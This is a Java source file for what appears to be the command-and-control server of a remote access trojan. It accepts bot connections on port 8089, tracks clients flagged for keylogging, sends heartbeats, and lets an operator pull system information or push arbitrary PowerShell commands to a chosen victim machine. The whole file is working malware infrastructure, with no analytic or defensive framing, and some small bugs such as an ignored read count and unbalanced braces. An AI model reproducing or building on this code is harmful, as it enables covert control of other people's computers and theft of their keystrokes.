import java.net.*;
import java.io.*;
import java.util.*;

public class server {

    private ArrayList<Socket> clientStorage;
    private ArrayList<Socket> clientsKeylogging;
    private ServerSocket server;

    public server(ArrayList<Socket> storage, ServerSocket server, ArrayList<Socket> keylogging) {
        this.clientStorage = storage;
        this.server = server;
        this.clientsKeylogging = keylogging;
    }

    // Accept incoming connections
    public Socket acceptConnection() throws IOException {
        Socket connection = null;

        connection = this.server.accept();

        System.out.println();
        System.out.println("[+]Connection");
        System.out.print(">");
        return connection;
    }

    public static void gap() {
        for (int i = 0; i < 5; i++) {
            System.out.println();
        }
    }


    public boolean showData(int index) throws IOException {

        Socket client = this.clientStorage.get(index);
        InputStream inputStream = client.getInputStream();
        byte[] buffer = new byte[1024];
        System.out.println("[+]Showing Data");
        int bytesRead;
        boolean run = true;

        try {
            while(run)
            {
                bytesRead = inputStream.read(buffer);
                String msg = new String(buffer, "UTF-8");
                if (!msg.contains("_"))
                {
                    run = false;
                    System.out.println(msg);
                }

            }
            return false;
        } catch (Exception e) {
            System.out.println("[+]Client Disconnected");
            return false;

        }

    }


    public void showAllClients() throws IOException {
        for (int i = 0; i < clientStorage.size(); i++) {
            System.out.println("[+] " + i + " " + clientStorage.get(i).getRemoteSocketAddress().toString());
        }

    }


    public void sendCommand(String input, int client) throws IOException {
        Socket socket = this.clientStorage.get(client);
        OutputStream outputStream = socket.getOutputStream();
        DataOutputStream dataOutputStream = new DataOutputStream(outputStream);

        Scanner scan = new Scanner(System.in);


        if (input.equals("a")) {
            dataOutputStream.write("A".getBytes());
            dataOutputStream.flush();
            this.showData(client);

        }


        if(input.equals("b"))
        {
            dataOutputStream.write("C".getBytes());
            dataOutputStream.flush();
            

            System.out.println("[+]What command would you like to send");
            System.out.print(">");
            String response = scan.nextLine();
            dataOutputStream.write(response.getBytes());
            dataOutputStream.flush();

        }

        if(input.equals("k"))
        {
            dataOutputStream.write("STOP".getBytes());
            dataOutputStream.flush();
            this.clientsKeylogging.remove(socket);
        }

    }


    public static void main(String[] args) throws IOException {

        ArrayList<Socket> storage = new ArrayList<Socket>();
        ArrayList<Socket> keylogging = new ArrayList<Socket>();
        Scanner userScanner = new Scanner(System.in);

        ServerSocket server = null;

        server = new ServerSocket(8089);
        server serverMain = new server(storage, server, keylogging);

        System.out.println("[+]Welcome to your v.0 of Remote Administratio, Initializing Connections: ");
        System.out.println();
        System.out.println();

        Thread backgroundThread = new Thread(() -> {

            while (true) {
                try {
                    serverMain.clientStorage.add(serverMain.acceptConnection());
                } catch (Exception e) {
                    System.out.println(e);
                }

            }

        });

        Thread backgroundThread2 = new Thread(() -> {
            while (true) {

                Iterator<Socket> iterator = serverMain.clientStorage.iterator();
                while (iterator.hasNext()) {

                    Socket s = iterator.next();

                    try {
                        OutputStream heartbeat = s.getOutputStream();
                        heartbeat.write("muzer!@#tyrz".getBytes());
                        heartbeat.flush();
                    } catch (IOException e) {
                        System.out.println("[+] Client " + s.getRemoteSocketAddress() + " disconnected");
                        System.out.print(">");
                        iterator.remove(); // Remove the current element from the list

                    }

                }

                try {
                    Thread.sleep(5000);
                } catch (Exception e) {
                    System.out.println(e);
                }

            }
        });

        backgroundThread.start();
        backgroundThread2.start();

        while (true) {
            
            gap();
            System.out.println("[+]What would you like to do: ");
            System.out.println("a) View all clients connected");
            System.out.println("b) Specific Bot Commands");
            System.out.println("z) Kill All Connections");
            System.out.println();
            System.out.print(">");

            String response = userScanner.nextLine();

            if (response.equals("a")) {
                serverMain.showAllClients();
            }
           
            if (response.equals("b")) {
                if (storage.size() > 0) {
                    serverMain.showAllClients();
                    System.out.println("[+]What client would you like to send a command to");
                    System.out.println();
                    System.out.print(">");
                    response = userScanner.nextLine();

                    int client = Integer.valueOf(response);

		    
		    System.out.println("[+]What command would you like to send");
                    System.out.println("a) Get System info");
                    System.out.println("b) Powershell Command");
                    System.out.print(">");

                    response = userScanner.nextLine();
                    serverMain.sendCommand(response, client);
		    

            }


            if (response.equals("z"))
            {
                System.out.println("[+]Are you sure you want to kill all connection, type YES to confirm");
                System.out.print(">");
                response = userScanner.nextLine();
                if(response.equals("YES"))
                {
                    for(Socket s: serverMain.clientStorage)
                    {
                        s.close();
                    }
                    System.out.println("[+]Killed all Connections");
                }
                else
                {
                    System.out.println("[+]Stopped Kill Process");
                }
               

                

            }

        }

    }

}
}
